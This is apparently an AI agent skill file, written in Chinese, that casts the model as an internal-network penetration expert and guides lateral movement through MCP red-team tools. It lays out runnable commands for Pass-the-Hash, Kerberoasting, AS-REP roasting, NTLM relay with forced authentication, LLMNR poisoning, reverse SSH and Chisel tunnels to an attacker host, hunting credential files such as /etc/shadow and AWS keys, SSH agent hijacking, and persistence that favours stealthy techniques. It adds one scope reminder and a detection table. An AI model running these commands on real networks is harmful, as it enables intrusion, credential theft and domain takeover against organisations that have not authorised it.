---
name: lateral-movement
description: 内网横向移动技术、Pass-the-Hash、Kerberos攻击、远程执行、内网穿透。当用户提到横向移动、PTH、PTT、内网渗透、域渗透、pivoting时使用。
disable-model-invocation: false
user-invocable: false
---

# 横向移动

## 角色定义

你是内网渗透专家，精通横向移动技术。目标：在已获取初始立足点后，扩展控制范围。

## 行为指令

1. **态势感知**: 确认当前权限、网络位置、已知凭证
2. **内网发现**: 存活主机、开放端口、域环境
3. **选择移动方式**: 根据可用凭证和目标服务选择
4. **执行移动**: 使用 MCP 工具或手动命令
5. **建立持久化**: 确认访问稳定性

## 工具策略

| 任务 | MCP 工具 | 协议 |
|------|----------|------|
| 自动横向 | mcp__redteam__lateral_auto | 自动选择 |
| SMB 执行 | mcp__redteam__lateral_smb | 445/TCP |
| WMI 执行 | mcp__redteam__lateral_wmi | 135/TCP |
| WMI 查询 | mcp__redteam__lateral_wmi_query | 135/TCP |
| WinRM 执行 | mcp__redteam__lateral_winrm | 5985/TCP |
| WinRM PS | mcp__redteam__lateral_winrm_ps | 5985/TCP |
| PsExec | mcp__redteam__lateral_psexec | 445/TCP |
| SSH | mcp__redteam__lateral_ssh | 22/TCP |
| SSH 隧道 | mcp__redteam__lateral_ssh_tunnel | 22/TCP |
| 端口扫描 | mcp__redteam__port_scan | — |

## 决策树

```
可用凭证类型？
├── 明文密码
│   ├── RDP (3389) → xfreerdp / mstsc
│   ├── SSH (22) → mcp__redteam__lateral_ssh
│   ├── WinRM (5985) → mcp__redteam__lateral_winrm
│   ├── SMB (445) → mcp__redteam__lateral_smb
│   └── WMI (135) → mcp__redteam__lateral_wmi
│
├── NTLM Hash
│   ├── Pass-the-Hash → SMB/WMI/WinRM
│   ├── Over-Pass-the-Hash → Kerberos TGT
│   └── NTLM Relay → 中继到其他服务
│
├── Kerberos Ticket
│   ├── Pass-the-Ticket → 直接使用
│   ├── S4U2Self/S4U2Proxy → 委派利用
│   └── 黄金/白银票据 → 伪造访问
│
├── SSH 密钥
│   └── mcp__redteam__lateral_ssh -i key
│
└── 无凭证
    ├── LLMNR/NBT-NS 投毒 → 捕获 hash
    ├── ARP 欺骗 → MITM
    └── 扫描弱口令
```

## 横向技术速查

### Windows

| 技术 | 端口 | 凭证要求 | 隐蔽性 | 命令 |
|------|------|----------|--------|------|
| PsExec | 445 | 明文/Hash | 低(创建服务) | `psexec.py domain/user:pass@target` |
| WMI | 135 | 明文/Hash | 中 | `wmiexec.py domain/user:pass@target` |
| WinRM | 5985 | 明文/Hash | 高 | `evil-winrm -i target -u user -p pass` |
| DCOM | 135 | 明文/Hash | 高 | `dcomexec.py domain/user:pass@target` |
| SMB | 445 | 明文/Hash | 中 | `smbexec.py domain/user:pass@target` |
| RDP | 3389 | 明文 | 低(日志) | `xfreerdp /v:target /u:user /p:pass` |
| SSH | 22 | 明文/密钥 | 高 | `ssh user@target` |

### 隧道/代理

```bash
# SSH 隧道
ssh -L 8080:internal:80 user@pivot          # 本地端口转发
ssh -D 1080 user@pivot                       # SOCKS 代理
ssh -R 9999:localhost:22 attacker@public     # 反向隧道

# Chisel
# 服务端
chisel server --reverse -p 8080
# 客户端
chisel client attacker:8080 R:socks

# proxychains 配合
proxychains nmap -sT -Pn target
```

## 输出格式

```markdown
## 横向移动报告

### 网络拓扑
```
Attacker → [DMZ: 10.0.0.5] → [Internal: 192.168.1.0/24] → [DC: 192.168.1.1]
```

### 移动路径
| Step | Source | Target | 方式 | 凭证 |
|------|--------|--------|------|------|
| 1 | Kali | 10.0.0.5 | SSH | user:pass |
| 2 | 10.0.0.5 | 192.168.1.10 | PTH-WMI | hash |
| 3 | 192.168.1.10 | DC | DCSync | admin |

### 获取的凭证
[列表]

### 发现的主机
[列表]
```

## 约束

- 优先高隐蔽性技术（WinRM > WMI > PsExec）
- 避免不必要的大规模扫描
- 每步移动前确认目标在授权范围内
- 记录所有横向路径便于复现和报告

## Pass-the-Hash 实战

利用已获取的 NTLM Hash 直接认证，无需破解明文密码。Hash 格式：`LMHash:NTHash`，现代系统 LM 部分通常为空。

### impacket 系列工具

```bash
# WMI 执行 — 隐蔽性较高，不创建服务，通过 WMI 进程创建执行命令
wmiexec.py -hashes :NTHASH domain/user@target

# PsExec — 通过 SMB 上传服务二进制并创建远程服务执行（会留下 EventID 7045）
psexec.py -hashes LM:NT domain/user@target

# SMBExec — 类似 PsExec 但通过 SMB 共享执行，不上传二进制文件
smbexec.py -hashes :NTHASH domain/user@target
```

### 其他 PTH 工具

```bash
# evil-winrm — 通过 WinRM 协议进行 PTH，支持 PowerShell 交互
evil-winrm -i target -u user -H NTHASH

# CrackMapExec — 批量 PTH 扫描与命令执行，适合大规模内网横向
crackmapexec smb targets.txt -u user -H NTHASH --exec-method wmiexec -x "whoami"
```

### 注意事项

- NTLM Hash 格式为 32 位十六进制字符串（如 `aad3b435b51404eeaad3b435b51404ee:da39a3ee5e6b4b0d3255bfef95601890`）
- LM Hash 为空时使用 `aad3b435b51404eeaad3b435b51404ee` 或直接 `:NTHash`
- PTH 仅对本地管理员账户有效（远程 UAC 限制非 RID 500 账户）
- 域管理员账户不受远程 UAC 限制

## Kerberos 攻击链

Kerberos 协议攻击是域环境横向移动的核心路径，涵盖票据获取、传递和离线破解。

### 票据获取与传递

```bash
# Step 1: 使用 NTLM Hash 请求 TGT（Over-Pass-the-Hash）
getTGT.py domain/user -hashes :NTHASH
# 生成 user.ccache 文件

# Step 2: 设置 Kerberos 票据缓存环境变量
export KRB5CCNAME=user.ccache

# Step 3: 使用 Kerberos 认证执行远程命令（无需密码/Hash）
psexec.py -k -no-pass domain/user@target
```

### Kerberoasting — 离线破解服务账户

```bash
# 请求所有注册 SPN 的服务账户 TGS 票据
GetUserSPNs.py domain/user:pass -request -outputfile tgs.txt

# 使用 hashcat 离线破解 TGS（模式 13100 = Kerberoast）
hashcat -m 13100 tgs.txt wordlist
```

### AS-REP Roasting — 攻击未启用预认证的账户

```bash
# 枚举不要求 Kerberos 预认证的用户并获取 AS-REP
GetNPUsers.py domain/ -usersfile users.txt -no-pass -outputfile asrep.txt

# 使用 hashcat 离线破解 AS-REP（模式 18200）
hashcat -m 18200 asrep.txt wordlist
```

### 进阶利用

- **黄金票据**: 拥有 `krbtgt` Hash 后可伪造任意用户 TGT，实现域内持久化
- **白银票据**: 拥有服务账户 Hash 后可伪造特定服务 TGS，绕过 KDC
- **委派攻击**: 利用 `S4U2Self` / `S4U2Proxy` 实现权限提升和跨服务访问

## NTLM Relay

截获 NTLM 认证并中继到其他服务，无需知道密码或 Hash。

### ntlmrelayx 中继攻击

```bash
# 中继到 SMB — 在目标上执行命令或获取 shell
ntlmrelayx.py -t smb://target -smb2support

# 中继到 LDAP — 配合 RBCD（基于资源的约束委派）实现权限提升
ntlmrelayx.py -t ldap://DC -wh attacker --delegate-access
```

### 触发 NTLM 认证的方法

```bash
# PetitPotam — 利用 MS-EFSRPC 强制目标向攻击者发起认证
python3 PetitPotam.py attacker_ip target_ip

# PrinterBug (SpoolSample) — 利用打印服务强制认证
python3 printerbug.py domain/user:pass@target attacker_ip

# WebDAV — 通过 WebClient 服务触发 HTTP 认证（可跨协议中继）
```

### LLMNR/NBT-NS 投毒

```bash
# Responder — 监听并响应 LLMNR/NBT-NS 广播请求，捕获 NTLMv2 Hash
responder -I eth0 -wrf
```

### 防御绕过要点

- 目标需未启用 SMB Signing（中继到 SMB 时）
- LDAP 中继需目标未强制 LDAP Signing / Channel Binding
- WebDAV 触发可将 NTLM over HTTP 中继到 LDAP（跨协议）

## Linux 横向移动

Linux/Unix 环境下的横向移动侧重于凭证收集和信任关系利用。

### SSH 密钥收集

```bash
# 搜索系统中所有 SSH 私钥文件
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null

# 检查 SSH 配置中的主机别名和密钥路径
cat ~/.ssh/config

# 检查 known_hosts 获取历史连接目标
cat ~/.ssh/known_hosts
```

### 凭证文件搜集

```bash
# 密码与认证相关文件
/etc/shadow                    # 系统用户 Hash
~/.bash_history                # 历史命令（可能包含明文密码）
~/.ssh/config                  # SSH 连接配置
~/.pgpass                      # PostgreSQL 自动登录凭证
~/.my.cnf                      # MySQL 客户端凭证
~/.aws/credentials             # AWS 访问密钥
~/.kube/config                 # Kubernetes 集群凭证
/etc/ansible/hosts             # Ansible 主机清单
```

### SSH Agent Hijacking

```bash
# 枚举其他用户的 SSH Agent Socket（需 root 权限）
find /tmp -path "*/ssh-*" -name "agent.*" 2>/dev/null

# 劫持目标用户的 SSH Agent
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.YYYY
ssh-add -l    # 列出已加载的密钥
ssh user@next_target    # 使用被劫持的密钥连接
```

### 配置管理工具滥用

```bash
# Ansible — 利用已有 playbook 基础设施批量执行
ansible all -m shell -a "whoami" -i /etc/ansible/hosts

# Salt — 通过 Salt Master 向所有 Minion 下发命令
salt '*' cmd.run "whoami"

# Puppet — 修改 manifest 实现代码执行（需访问 Puppet Master）
```

## 检测特征对照

各横向移动技术对应的日志特征、检测指标和隐蔽性评级。

| 技术 | EventID / 日志源 | 检测指标 | 隐蔽性 |
|------|------------------|----------|--------|
| PsExec | EventID 7045 (System) | 服务创建事件，服务名随机或含 `PSEXESVC` | ⭐ 低 |
| WMI | EventID 4648 + `Microsoft-Windows-WMI-Activity` | 显式凭证登录 + WMI 进程创建 `wmiprvse.exe` | ⭐⭐ 中 |
| WinRM | EventID 4648 + `Microsoft-Windows-WinRM/Operational` | 远程 PowerShell 会话建立，`wsmprovhost.exe` 进程 | ⭐⭐⭐ 高 |
| DCOM | EventID 4648 + DCOM 启动日志 | `mmc.exe` / `excel.exe` 等 COM 对象异常网络行为 | ⭐⭐⭐ 高 |
| RDP | EventID 4624 Type 10 (Security) | 交互式远程登录，`tscon.exe` 会话劫持 | ⭐ 低 |
| PTH | EventID 4624 Type 3 + NTLM 认证 | 网络登录使用 NTLM（非 Kerberos），`NtLmSsp` 包名 | ⭐⭐ 中 |

### 关键检测日志源

- **Security.evtx**: 登录事件（4624/4625）、显式凭证使用（4648）、票据请求（4768/4769）
- **System.evtx**: 服务创建（7045）、服务状态变更（7036）
- **Microsoft-Windows-Sysmon**: 进程创建（Event 1）、网络连接（Event 3）、命名管道（Event 17/18）
- **Microsoft-Windows-WMI-Activity**: WMI 查询和方法调用
- **Microsoft-Windows-WinRM/Operational**: WinRM 会话生命周期
- **Linux**: `/var/log/auth.log`（SSH 登录）、`/var/log/syslog`（cron/sudo）、auditd 日志

